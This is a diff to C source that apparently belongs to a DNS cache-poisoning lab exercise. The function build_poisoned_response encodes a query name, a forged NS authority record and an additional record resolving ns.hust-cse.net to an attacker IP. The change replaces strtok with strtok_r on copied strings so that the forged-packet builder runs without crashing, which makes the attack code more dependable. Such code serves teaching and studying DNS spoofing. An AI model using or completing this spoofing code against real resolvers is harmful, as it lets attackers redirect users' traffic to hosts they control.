@@ -114,15 +114,20 @@ void build_poisoned_response(char *buffer, int *length, unsigned short trans_id,
     char *ptr = buffer + sizeof(struct dns_header);
     
     // Build query domain (www123456.example.com format)
-    char *token = strtok(query_domain, ".");
+    // We use strtok_r to parse the query_domain
+    char *token;
+    char *saveptr1;
+    char *qname_copy = strdup(query_domain);
+    token = strtok_r(qname_copy, ".", &saveptr1);
     while(token != NULL) {
         int len = strlen(token);
         *ptr++ = len;
         memcpy(ptr, token, len);
         ptr += len;
-        token = strtok(NULL, ".");
+        token = strtok_r(NULL, ".", &saveptr1);
     }
     *ptr++ = 0;
+    free(qname_copy);
     
     // Question section
     struct dns_question *question = (struct dns_question*)ptr;
@@ -159,30 +164,36 @@ void build_poisoned_response(char *buffer, int *length, unsigned short trans_id,
     
     // Calculate NS record data length
     char *ns_start = ptr;
-    char *ns_token = strtok(target_ns, ".");
-    while(ns_token != NULL) {
-        int len = strlen(ns_token);
+    char *ns_copy = strdup(target_ns);
+    char *saveptr2;
+    token = strtok_r(ns_copy, ".", &saveptr2);
+    while(token != NULL) {
+        int len = strlen(token);
         *ptr++ = len;
-        memcpy(ptr, ns_token, len);
+        memcpy(ptr, token, len);
         ptr += len;
-        ns_token = strtok(NULL, ".");
+        token = strtok_r(NULL, ".", &saveptr2);
     }
     *ptr++ = 0;
+    free(ns_copy);
     
     authority->rdlength = htons(ptr - ns_start);
     
     // Additional section (resolve ns.hust-cse.net to attacker IP)
     char *add_start = ptr;
     char *add_ns = "ns.hust-cse.net";
-    char *add_token = strtok(add_ns, ".");
-    while(add_token != NULL) {
-        int len = strlen(add_token);
+    char *add_copy = strdup(add_ns);
+    char *saveptr3;
+    token = strtok_r(add_copy, ".", &saveptr3);
+    while(token != NULL) {
+        int len = strlen(token);
         *ptr++ = len;
-        memcpy(ptr, add_token, len);
+        memcpy(ptr, token, len);
         ptr += len;
-        add_token = strtok(NULL, ".");
+        token = strtok_r(NULL, ".", &saveptr3);
     }
     *ptr++ = 0;
+    free(add_copy);
     
     struct dns_rr *additional = (struct dns_rr*)ptr;
     additional->type = htons(1);     // A record
